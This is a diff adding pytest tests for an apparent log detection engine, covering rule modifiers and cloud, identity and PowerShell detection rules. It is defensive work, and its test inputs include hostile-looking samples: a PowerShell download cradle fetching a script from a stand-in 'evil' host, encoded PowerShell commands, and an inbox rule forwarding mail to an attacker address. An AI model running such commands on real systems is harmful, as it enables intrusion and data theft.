@@ -58,6 +58,46 @@ def test_condition_one_of_and_all_of_wildcard():
     assert not _match(d2, action="deny", protocol="udp")
 
 
+def test_modifier_cidr():
+    d = {"s": {"src_ip|cidr": ["10.0.0.0/8", "192.168.0.0/16"]}, "condition": "s"}
+    assert _match(d, src_ip="10.1.2.3") and _match(d, src_ip="192.168.5.5")
+    assert not _match(d, src_ip="203.0.113.9")
+    assert not _match(d, src_ip="not-an-ip")
+
+
+def test_modifier_numeric_comparisons():
+    assert _match({"s": {"dst_port|gte": 1024}, "condition": "s"}, dst_port=3389)
+    assert not _match({"s": {"dst_port|lt": 1024}, "condition": "s"}, dst_port=3389)
+    assert _match({"s": {"bytes_total|gt": 1000000}, "condition": "s"}, bytes_total=5_000_000)
+
+
+def test_modifier_exists_and_fieldref():
+    assert _match({"s": {"user_name|exists": True}, "condition": "s"}, user_name="jdoe")
+    assert _match({"s": {"host_name|exists": False}, "condition": "s"})       # absent
+    assert not _match({"s": {"user_name|exists": True}, "condition": "s"})
+    # fieldref: user_name equals the (raw) caller field
+    d = {"s": {"user_name|fieldref": "caller"}, "condition": "s"}
+    assert _match(d, user_name="svc-1", raw={"caller": "svc-1"})
+    assert not _match(d, user_name="svc-1", raw={"caller": "other"})
+
+
+def test_modifier_base64offset_and_windash():
+    # 'IEX' embedded anywhere in a base64 blob is caught by base64offset|contains
+    import base64
+    blob = base64.b64encode(b"random IEX(New-Object Net.WebClient)").decode()
+    assert _match({"s": {"message|base64offset|contains": "IEX"}, "condition": "s"},
+                  message=blob)
+    # windash: a rule written with -enc also matches the /enc form
+    d = {"s": {"message|windash|contains": "-enc"}, "condition": "s"}
+    assert _match(d, message="powershell -enc ABC") and _match(d, message="powershell /enc ABC")
+
+
+def test_modifier_re_flags():
+    # multiline + ignorecase via |re|m|i
+    d = {"s": {"message|re|m|i": "^error"}, "condition": "s"}
+    assert _match(d, message="line one\nERROR happened")
+
+
 def test_logsource_filters_by_vendor_and_logtype():
     d = {"s": {"action": "failed-logon"}, "condition": "s"}
     ls = {"vendor": "microsoft", "log_type": "security"}
@@ -90,6 +130,63 @@ def test_engine_fires_expected_rules():
     assert "lo-ingress-tool-transfer" in hits(
         vendor="x", message="powershell Invoke-WebRequest http://evil/x.ps1")
     assert "lo-clear-eventlog" in hits(vendor="microsoft", raw={"EventID": 1102})
+
+
+def test_rule_pack_loads_and_is_well_formed():
+    rules = load_rules(RULES_DIR)
+    by_id = {r.id for r in rules}
+    expected = {"lo-aws-logging-disabled", "lo-aws-root-console-login",
+                "lo-aws-sg-open-world", "lo-aws-access-key-created",
+                "lo-entra-risky-signin", "lo-entra-legacy-auth",
+                "lo-okta-admin-grant", "lo-okta-mfa-deactivated",
+                "lo-m365-inbox-forwarding", "lo-github-repo-public",
+                "lo-powershell-encoded", "lo-external-rdp-inbound"}
+    assert expected <= by_id
+    # every shipped detection rule has a level, a condition and parsed MITRE tags
+    for r in rules:
+        assert r.level in ("low", "medium", "high", "critical", "informational")
+        assert r.detection.get("condition")
+        assert r.techniques, f"{r.id} has no technique tag"
+
+
+def test_engine_fires_cloud_and_identity_rules():
+    eng = DetectionEngine(load_rules(RULES_DIR))
+
+    def hits(**kw):
+        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}
+
+    assert "lo-aws-logging-disabled" in hits(
+        vendor="aws", product="cloudtrail", rule_name="StopLogging")
+    assert "lo-aws-root-console-login" in hits(
+        vendor="aws", product="cloudtrail", rule_name="ConsoleLogin",
+        raw={"userIdentity": {"type": "Root"}})
+    assert "lo-entra-risky-signin" in hits(
+        vendor="microsoft", product="entra", log_type="signin",
+        action="success", severity="high")
+    assert "lo-entra-risky-signin" not in hits(
+        vendor="microsoft", product="entra", log_type="signin",
+        action="success", severity="low")
+    assert "lo-m365-inbox-forwarding" in hits(
+        vendor="microsoft", product="o365", action="New-InboxRule",
+        message="Created rule with ForwardTo attacker@evil.test")
+    assert "lo-okta-mfa-deactivated" in hits(
+        vendor="okta", log_type="user.mfa.factor.deactivate")
+
+
+def test_engine_fires_modifier_rules():
+    eng = DetectionEngine(load_rules(RULES_DIR))
+
+    def hits(**kw):
+        return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}
+
+    # cidr: public source fires, RFC1918 source does not
+    assert "lo-external-rdp-inbound" in hits(
+        vendor="paloalto", dst_port=3389, action="allow", src_ip="203.0.113.7")
+    assert "lo-external-rdp-inbound" not in hits(
+        vendor="paloalto", dst_port=3389, action="allow", src_ip="10.20.30.40")
+    # windash: the /enc form of an encoded PowerShell command
+    assert "lo-powershell-encoded" in hits(
+        vendor="x", message="powershell.exe /enc SQBFAFgA")
 
 
 def test_alert_from_match_builds_row():
